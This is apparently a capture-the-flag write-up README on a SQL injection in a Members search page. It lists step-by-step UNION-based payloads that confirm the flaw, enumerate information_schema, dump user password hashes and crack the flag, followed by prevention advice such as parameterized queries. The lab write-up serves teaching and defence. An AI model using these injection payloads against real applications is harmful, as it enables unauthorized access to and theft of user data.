# SQL Injection: Members Page Vulnerability

## Overview

This repo demonstrates a SQL Injection vulnerability found on a Members page, showing how attackers can exploit weak input validation to extract sensitive data.

---

## Discovery & Exploitation

### 1. Confirm the Vulnerability
- Input in search: `1 OR TRUE`
- Result: Returns all members, confirming SQL injection.

### 2. Extract DB Info
- Query: `-1 union select database(), user()`
- Result: Reveals DB name and user.

### 3. Enumerate Structure
- Query: `-1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database() --`
- Result: Lists table/column names (e.g., `users`, `user_id`, `countersign`, etc.)

### 4. Dump User Data
- Query: `-1 UNION SELECT concat(Commentaire, countersign), concat(user_id,first_name,last_name, country,town,planet) FROM users --`
- Result: Exposes sensitive data, including password hashes and hints.

### 5. Crack the Flag
- Extract hash: `5ff9d0165b4f92b14994e5c685cdce28`
- MD5 decrypt: `FortyTwo` → lowercase → `fortytwo`
- SHA-256: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5` (the flag)

---

## Prevention

1. **Parameterized Queries**
    ```php
    $stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->bind_param("i", $user_id);
    ```
2. **Input Validation**
    ```php
    if (!is_numeric($user_id)) { exit("Invalid input"); }
    ```
3. **Database Security**
    - Use least-privilege DB accounts
    - Hide error messages
    - Monitor activity

4. **Web Application Firewall**
    - Deploy a WAF to block common attacks

5. **Regular Security Testing**
    - Run frequent scans and penetration tests

---

> Weak input validation can lead to full data exposure. Use secure coding practices to protect your applications.